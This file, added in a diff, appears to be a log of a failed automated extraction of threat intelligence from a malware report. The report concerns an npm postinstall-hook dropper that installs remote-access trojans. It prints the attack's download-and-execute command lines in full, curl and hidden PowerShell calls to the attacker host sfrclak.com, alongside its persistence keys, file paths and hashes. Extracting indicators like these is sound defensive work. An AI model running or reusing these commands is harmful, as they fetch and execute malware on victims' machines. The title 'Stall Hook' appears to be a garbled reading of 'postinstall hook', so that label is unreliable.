@@ -1,0 +1,67 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T20:16:46.326127
+# Response length: 2898 chars
+# Input chunk preview: 'stall hook that kicks off the dropper:"scripts": {"postinstall": "node setup.js"}CopyPackage Hashes| Package | SHA | Status ||---|---|---|| axios@1.14.1 | 2553649f232204966871cea80a5d0d6adc700ca | MAL'
+# ============================================================
+
+title: "Stall Hook Malware Analysis"
+description: The stall hook malware uses a Node.js dropper to deliver platform-specific RATs via encrypted strings in setup.js.
+attribution: ""
+malware_families:
+  - Windows RAT
+  - Linux RAT
+cves: []
+ttps:
+  processes:
+    - powershell.exe
+    - cmd.exe
+    - curl
+    - python3
+    - osascript
+  command_lines:
+    - "curl -o /tmp/ld.py -d packages.npm.org/product2 -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &"
+    - "nohup osascript /tmp/6202033 > /dev/null 2>&1 &"
+    - "curl -o /tmp/.<random_6_characters> -d <base64_payload> -s http://sfrclak.com:8000/6202033&& chmod 777 /tmp/.<random_6_characters> && /tmp/.<random_6_characters>"
+    - "curl -o /tmp/ld.py -d packages.npm.org/product1 -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &"
+    - "curl -o /tmp/.<random_6_characters> -d <base64_payload> -s http://sfrclak.com:8000/6202033&& chmod 777 /tmp/.<random_6_characters> && /tmp/.<random_6_characters>"
+    - "Invoke-WebRequest -Uri http://sfrclak.com:8000/6202033 -Method POST -Body packages.npm.org/product1 | Out-File -FilePath %TEMP%\ld.ps1; powershell.exe -w hidden -ep bypass -File %TEMP%\ld.ps1"
+  powershell:
+    - "Invoke-WebRequest -Uri http://sfrclak.com:8000/6202033 -Method POST -Body packages.npm.org/product1 | Out-File -FilePath %TEMP%\ld.ps1; powershell.exe -w hidden -ep bypass -File %TEMP%\ld.ps1"
+    - "{[Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<base64_payload>))}"
+  scripts:
+    - "node setup.js"
+    - "curl -o /tmp/ld.py -d packages.npm.org/product2 -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &"
+    - "nohup osascript /tmp/6202033 > /dev/null 2>&1 &"
+    - "{[Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<base64_payload>))}"
+  registry_keys:
+    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate
+  image_loads: []
+  network_connections:
+    - "curl -> sfrclak.com:8000"
+    - "powershell.exe -> sfrclak.com:8000"
+    - "python3 -> sfrclak.com:8000"
+    - "osascript -> sfrclak.com:8000"
+  file_activity:
+    - %PROGRAMDATA%\wt.exe
+    - %TEMP%\6202033.vbs
+    - %TEMP%\ld.ps1
+    - /tmp/ld.py
+    - /tmp/.<random_6_characters>
+    - /Library/Caches/com.apple.act.mond
+  persistence:
+    - Registry Run key (HKCU) pointing to %PROGRAMDATA%\system.bat
+    - system.bat file in %PROGRAMDATA%
+    - AppleScript in /tmp/<campaignId>
+  process_relations: []
+iocs:
+  hashes:
+    - 2553649f232204966871cea80a5d0d6adc700ca
+    - d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71
+    - 07d889e2dadce6f3910dcbc253317d28ca61c766
+    - 7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb
+  ip_addresses: []
+  domains:
+    - sfrclak.com
+  urls:
+    - hxxps://sfrclak[.]com:8000/
+authors: []
